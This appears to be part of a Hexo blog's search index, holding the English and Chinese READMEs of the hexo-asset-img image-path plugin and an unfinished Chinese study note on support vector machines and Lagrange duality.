<!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> -->
</p>
<h1 align="center">hexo-asset-img</h1>

<p>English | <a href="README_zh.md">中文</a></p>
<blockquote>
<p>:cake: Hexo local image plugin: Convert the relative path of the image to asset_img</p>
</blockquote>
<p><a href><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p>
<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>Use this plug-in to realize the preview of Markdown editors such as Typora and Hexo release preview, both of which can display pictures normally</p>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Latest Dev</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">├── apppicker.jpg</span><br><span class="line">├── logo.png</span><br><span class="line">└── rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure>

<p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p>
<p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p>
<h3 id="Use-with-Typora"><a href="#Use-with-Typora" class="headerlink" title="Use with Typora"></a>Use with Typora</h3><ul>
<li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + Hexo plug-in development to solve the inconsistency of image paths | yiyun’s Blog</a></li>
</ul>
<h2 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> No longer valid, probably starting from <code>Hexo 5</code>, and this repository has been archived </p>
<blockquote>
<p>Q: 为什么使用本地图片 而不是网络图片 (图床) ?<br>A:</p>
<ol>
<li>第三方图床不稳定, 容易丢失图片    </li>
<li>自行搭建图床, 随着上传错误图片, 删除文章而没有删除关联图片 次数的增多, 未引用图片越来越多, 图床中也越来越多的无用冗余图片, 还不方便删除, 也容易误删除     </li>
<li>本地图片 与 文章在一个文件夹, 易打包, 在无网络或网络较差时也能预览   </li>
<li>本地图片 放在与 文章文件名同名文件夹内 方便管理</li>
</ol>
<p><code>补充:</code><br>很多 <code>markdown编辑器</code> 提供粘贴图片到本地图片文件夹, 这些图片文件名通常不易读, 较长, 如果每次删除文章中的图片引用, 都手动去删除相应图片, 以及删除文章, 手动删除关联图片文件夹, 比较麻烦, 但不删除, 未引用图片又会越来越多, 因此 <code>删除未引用图片工具</code> 应运而生!      </p>
<ul>
<li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li>
<li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: 🧰 .NET 自用CLI, 工具集</a></li>
</ul>
</blockquote>
<h2 id="Related-Projects"><a href="#Related-Projects" class="headerlink" title="Related Projects"></a>Related Projects</h2><ul>
<li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li>
<li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li>
<li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li>
<li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li>
</ul>
<h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p>
<p>We accept donations through these channels:</p>
<ul>
<li><a href="https://afdian.net/@yiyun" target="_blank">爱发电</a></li>
</ul>
<h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> © <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p>
<blockquote>
<p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/12/08/node_modules/hexo-asset-img/README_zh/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p align="center">
<!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> -->
</p>
<h1 align="center">hexo-asset-img</h1>

<p><a href="README.md">English</a> | 中文</p>
<blockquote>
<p>:cake: Hexo 本地图片插件: 转换 图片相对路径 为 asset_img</p>
</blockquote>
<p><a href><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>使用本插件 即可实现 Typora 等 Markdown 编辑器预览 与 Hexo 发布预览 均能正常显示图片</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure>

<blockquote>
<p>最新开发版</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">├── apppicker.jpg</span><br><span class="line">├── logo.png</span><br><span class="line">└── rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure>

<p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p>
<p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p>
<h3 id="与-Typora-配合使用"><a href="#与-Typora-配合使用" class="headerlink" title="与 Typora 配合使用"></a>与 Typora 配合使用</h3><ul>
<li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + 开发Hexo插件 解决图片路径不一致 | yiyun’s Blog</a></li>
</ul>
<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> 已无效, 大概是从 <code>Hexo 5</code> 开始，并且此仓库已 archived </p>
<blockquote>
<p>Q: 为什么使用本地图片 而不是网络图片 (图床) ?<br>A:</p>
<ol>
<li>第三方图床不稳定, 容易丢失图片    </li>
<li>自行搭建图床, 随着上传错误图片, 删除文章而没有删除关联图片 次数的增多, 未引用图片越来越多, 图床中也越来越多的无用冗余图片, 还不方便删除, 也容易误删除     </li>
<li>本地图片 与 文章在一个文件夹, 易打包, 在无网络或网络较差时也能预览   </li>
<li>本地图片 放在与 文章文件名同名文件夹内 方便管理</li>
</ol>
<p><code>补充:</code><br>很多 <code>markdown编辑器</code> 提供粘贴图片到本地图片文件夹, 这些图片文件名通常不易读, 较长, 如果每次删除文章中的图片引用, 都手动去删除相应图片, 以及删除文章, 手动删除关联图片文件夹, 比较麻烦, 但不删除, 未引用图片又会越来越多, 因此 <code>删除未引用图片工具</code> 应运而生!      </p>
<ul>
<li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li>
<li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: 🧰 .NET 自用CLI, 工具集</a></li>
</ul>
</blockquote>
<h2 id="相关项目"><a href="#相关项目" class="headerlink" title="相关项目"></a>相关项目</h2><ul>
<li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li>
<li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li>
<li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li>
<li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li>
</ul>
<h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p>
<p>We accept donations through these channels:</p>
<ul>
<li><a href="https://afdian.net/@yiyun" target="_blank">爱发电</a></li>
</ul>
<h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> © <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p>
<blockquote>
<p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>支持向量机（SVM）</title>
    <url>/2025/10/07/SVM/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h1><p>[toc]</p>
<h3 id="数学基础补充"><a href="#数学基础补充" class="headerlink" title="数学基础补充"></a>数学基础补充</h3><h4 id="二元函数的无条件极值问题"><a href="#二元函数的无条件极值问题" class="headerlink" title="二元函数的无条件极值问题"></a>二元函数的无条件极值问题</h4><ol>
<li>求偏导等于0，找到所有驻点（必要条件）</li>
<li>求二阶偏导，依次确定各驻点处A、B、C的值，根据$$AC-B^2$$的符号判断是否为极值点（充分条件）<ol>
<li>大于0，有极值。A&gt;0极小值，反之极大值</li>
<li>小于0，没有极值</li>
<li>等于0，可能有也可能没有</li>
</ol>
</li>
</ol>
<p>这通常对应一个<strong>最简单的无约束优化问题</strong></p>
<h4 id="条件极值和拉格朗日乘数法"><a href="#条件极值和拉格朗日乘数法" class="headerlink" title="条件极值和拉格朗日乘数法"></a>条件极值和拉格朗日乘数法</h4><p>条件极值：对自变量有附加条件的极值</p>
<p>设二元函数$$f(x,y)$$和$$\phi(x,y)$$在区域D内有一阶连续偏导数，则求$$z &#x3D; f(x,y)$$在D内满足条件$$\phi(x,y)$$的极值问题，可以转化为求拉格朗日函数<br>$$<br>L(x,y,\lambda) &#x3D; f(x,y) + \lambda\phi(x,y)~~~~~	(其中\lambda是某一常数)<br>$$<br>的无条件极值问题</p>
<p>其中我们称一维向量$$\lambda_i$$是一个拉格朗日乘子</p>
<p>这通常用于<strong>求解带有等式约束的优化问题</strong></p>
<h4 id="数学符号说明"><a href="#数学符号说明" class="headerlink" title="数学符号说明"></a>数学符号说明</h4><h5 id="最大最小"><a href="#最大最小" class="headerlink" title="最大最小"></a>最大最小</h5><p>$$<br>g(\lambda) &#x3D; max_{x \in D}f(x,\lambda)<br>$$</p>
<ul>
<li>这是一个关于$$\lambda$$的函数</li>
<li>当 $$\lambda &#x3D; y$$ 时，$$g(\lambda)$$ 的取值为： 固定 $$f(x,\lambda)$$ 中的 $$\lambda &#x3D; y $$ ，变动 x 时 f 能娶到的最大值</li>
</ul>
<p>$$<br>g(\lambda) &#x3D; max_\lambda ~min_x ~f(x,\lambda)<br>$$</p>
<ul>
<li>从右往左看，首先把min这一项看作关于$$\lambda$$ 的函数$$g(\lambda)$$ ，然后求这个函数的最大值</li>
</ul>
<h5 id="inf和sup符号"><a href="#inf和sup符号" class="headerlink" title="inf和sup符号"></a>inf和sup符号</h5><p>inf 是下确界，sup 上确界。和最大最小值相似但不同，max f 不存在的情况下 sup f 可能存在</p>
<h5 id="凸函数凹函数"><a href="#凸函数凹函数" class="headerlink" title="凸函数凹函数"></a>凸函数凹函数</h5><p>使用国内定义还是国际定义仁者见仁智者见智了（<strong>以下使用国际定义</strong>）</p>
<p>但是要记得詹森不等式<br>$$<br>凸函数：和的函数值 \le 函数值的和 \<br>凹函数：和的函数值 \ge 函数值的和<br>$$<br><a href="https://wetts.github.io/2019/09/11/%E6%95%B0%E5%AD%A6/%E5%85%B6%E4%BB%96/%E4%BB%BF%E5%B0%84%E5%87%BD%E6%95%B0%E5%92%8C%E7%BA%BF%E6%80%A7%E5%87%BD%E6%95%B0/">仿射函数</a>是又凹又凸的</p>
<p>max是凹函数、min是凸函数（利用詹森不等式证明）</p>
<h4 id="拉格朗日对偶问题"><a href="#拉格朗日对偶问题" class="headerlink" title="拉格朗日对偶问题"></a>拉格朗日对偶问题</h4><h5 id="原问题"><a href="#原问题" class="headerlink" title="原问题"></a>原问题</h5><p>$$<br>\begin{aligned}<br>	\min_{\mathbf{x}\in \mathbb{R} ^{\mathtt{n}}} \mathbf{f}\left( \mathbf{x} \right)\<br>	\mathbf{s}.\mathbf{t}\quad \mathbf{c}<em>{\mathtt{i}}\left( \mathbf{x} \right) &amp;\leqslant \mathbf{0},\mathbf{i}\in \left[ \mathtt{1},\mathtt{k} \right]\<br>	\quad \quad \mathtt{h}</em>{\mathtt{j}}\left( \mathbf{x} \right) &amp;&#x3D;\mathbf{0},\mathbf{j}\in \left[ \mathtt{1},\mathbf{l} \right]\<br>\end{aligned}<br>$$</p>
<p><a href="https://zh.wikipedia.org/wiki/%E5%87%B8%E5%84%AA%E5%8C%96">凸优化</a> 要求$$f(x)$$ 是凸函数， $$c_i(x)$$ 是凸函数， $$h_j(x)$$ 是仿射函数</p>
<p>但这里我们做两个约定</p>
<ul>
<li>我们不假定原函数 f 的凹凸性， f 既可以是凹函数也可以是凸函数</li>
<li>问题的定义域 $$\mathrm{D}&#x3D;(\mathrm{dom} \mathrm{f)}\cap (\bigcap\nolimits_{\mathrm{i}&#x3D;1}^{\mathrm{k}}{\mathrm{c}<em>{\mathrm{i}})}\cap (\bigcap\nolimits</em>{\mathrm{i}&#x3D;1}^{\mathrm{l}}{\mathrm{h}_{\mathrm{i}})}$$</li>
<li>D 不是 空集</li>
<li>我们约定最终求出来的最优结果用$$p^*$$表示</li>
</ul>
<h5 id="对偶问题"><a href="#对偶问题" class="headerlink" title="对偶问题"></a>对偶问题</h5><p>定义：实质相同但从不同角度提出不同提法的一对问题。</p>
<p>在原问题中, 约束条件太多，并且凹凸性不明确。 于是我们将他转化为拉格朗日对偶问题。这样的有点是：只有一个约束，并且拉格朗日对偶问题一定是凹的。</p>
<p>证明如下：</p>
<ol>
<li>类比于等式约束的最值问题，我们为原问题构建一个广义拉格朗日函数</li>
</ol>
<p>$$<br>\begin{aligned}<br>	\mathcal{L} :\mathbb{R} ^{\mathtt{n}}\times \mathbb{R} ^{\Bbbk}\times \mathbb{R} ^{\mathrm{l}}\rightarrow \mathrm{R}\<br>	\mathcal{L} (\mathtt{x},\mathrm{\lambda},\mathrm{\mu)}&amp;&#x3D;\mathtt{f}(\mathtt{x})+\sum_{\mathrm{i}&#x3D;1}^{\mathrm{k}}{\lambda <em>{\mathrm{i}}\mathrm{c}</em>{\mathrm{i}}(\mathtt{x})}+\sum_{\mathrm{j}&#x3D;1}^{\mathrm{l}}{\mathrm{\mu}<em>{\mathrm{j}}\mathrm{h}</em>{\mathrm{j}}(\mathtt{x})}\<br>	\vec{\mathtt{x}}\in \mathbb{R} ^{\mathtt{n}},\vec{\lambda}\in \mathbb{R} ^{\Bbbk},\vec{\mathrm{\mu}}\in \mathbb{R} ^{\mathrm{l}}\<br>\end{aligned}<br>$$</p>
<ol start="2">
<li>根据 L 我们定义一个拉格朗日对偶函数 g(lambda, mu)</li>
</ol>
<p>$$<br>\begin{aligned}<br>	\mathtt{g}(\mathrm{\lambda},\mathrm{\mu)}&amp;&#x3D;\mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\mathcal{L} (\mathtt{x},\mathrm{\lambda},\mathrm{\mu)}\<br>	&amp;&#x3D;\mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\bigl( \mathtt{f}(\mathtt{x})+\sum_{\mathtt{i}&#x3D;\mathtt{l}}^{\mathtt{k}}{\lambda <em>{\mathtt{i}}\mathrm{c}</em>{\mathtt{i}}(\mathtt{x})}+\sum_{\mathtt{j}&#x3D;\mathtt{l}}^{\mathtt{l}}{\mathrm{\mu}<em>{\mathtt{j}}\mathrm{h}</em>{\mathtt{j}}(\mathtt{x})} \bigr)\<br>	\lambda &amp;\geqslant 0\<br>\end{aligned}<br>$$</p>
<p>​	可以证明这个函数一定是凹函数。</p>
<p>我们总结得到：<strong>不管原函数 f 的凹凸性， 它的对偶函数 g 一定是凹函数</strong></p>
<p>我们之所以需要这么一个对偶函数是因为<strong>只要 λ 不小于 0 ， g的值永远不会超过 $$p^*$$</strong>。证明略</p>
<p>也就是说， $$p^*$$永远都不会小于 $$max~g(\lambda,\mu)$$</p>
<h5 id="从原问题到拉格朗日对偶问题"><a href="#从原问题到拉格朗日对偶问题" class="headerlink" title="从原问题到拉格朗日对偶问题"></a>从原问题到拉格朗日对偶问题</h5><p>我们通过拉格朗日对偶函数给出了最优解 $$p^<em>$$的下界，也就是说我们通过求$$max~g(\lambda,\mu)$$来逼近$$p^</em>$$的值</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage2@main/999097456ceba220cd75ceae4f92041c.png" alt="在这里插入图片描述" style="zoom: 50%;">

<p>回顾原问题，我们现在给出对偶问题的形式<br>$$<br>\begin{aligned}<br>	\max_{\lambda ,\mu} \mathtt{g}(\lambda ,\mu )&amp;&#x3D;\max_{\lambda ,\mu} \mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\mathcal{L} (\mathtt{x},\lambda ,\mu )\<br>	\mathrm{s}.\mathrm{t}\quad \lambda _{\mathtt{i}}&amp;\geqslant \mathtt{0},\mathtt{i}&#x3D;\mathtt{1},\mathtt{2},…,\mathtt{k}\<br>\end{aligned}<br>$$<br>这是个凸优化问题，我们转而去求 d^* 了。</p>
<h4 id="KKT条件"><a href="#KKT条件" class="headerlink" title="KKT条件"></a>KKT条件</h4><p>学习中……</p>
<h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><h4 id="超平面"><a href="#超平面" class="headerlink" title="超平面"></a>超平面</h4><p>二维空间上，两类点被一条直线完全分开叫做线性可分</p>
<p>拓展到n维空间上，将n维欧氏空间上的两个点集$$D_1$$ 和$$D_2$$完全正确地划分开的 $$wx + b &#x3D; 0$$就成了一个超平面。</p>
<h4 id="支持向量"><a href="#支持向量" class="headerlink" title="支持向量"></a>支持向量</h4><p>样本中距离超平面最近的一些点叫做支持向量</p>
<p><img src="https://picx.zhimg.com/v2-0f1ccaf844905148b7e75cab0d0ee2e3_1440w.jpg" alt="img"></p>
<h3 id="SVM最优化问题"><a href="#SVM最优化问题" class="headerlink" title="SVM最优化问题"></a>SVM最优化问题</h3><p>SVM想要找到的就是 最大间隔超平面，即支持向量离超平面最远</p>
<p>任意超平面可以用以下线性方程来描述：<br>$$<br>w^T x + b &#x3D; 0<br>$$<br>由点到直线的距离公式推导可得，n维向量到超平面的距离为：<br>$$<br>\frac{|w^T x + b &#x3D; 0|}{||w||}<br>$$<br>其中 $$||w||$$ &#x3D; $$\sqrt{w_1^2+…+w_n^2}$$</p>
<p>我们假设支持向量到超平面的距离为 d，可知其他向量到超平面的距离 &gt; d，于是我们可以这样描述超平面两端的向量：<br>$$<br>\left{ \begin{aligned}<br>	\frac{\boldsymbol{w}^T\boldsymbol{x}+\boldsymbol{b}}{||\boldsymbol{w}||}&amp;\ge \boldsymbol{d}\quad \boldsymbol{y}&#x3D;\boldsymbol{1}\<br>	\frac{\boldsymbol{w}^T\boldsymbol{x}+\boldsymbol{b}}{||\boldsymbol{w}||}&amp;\le -\boldsymbol{d}\quad \boldsymbol{y}&#x3D;-\boldsymbol{1}\<br>\end{aligned} \right.<br>$$<br>由于 $$||w||d$$ 严格大于0，我们假设它为 1 </p>
<h2 id="sklearn实现SVM"><a href="#sklearn实现SVM" class="headerlink" title="sklearn实现SVM"></a>sklearn实现SVM</h2>]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
</search>
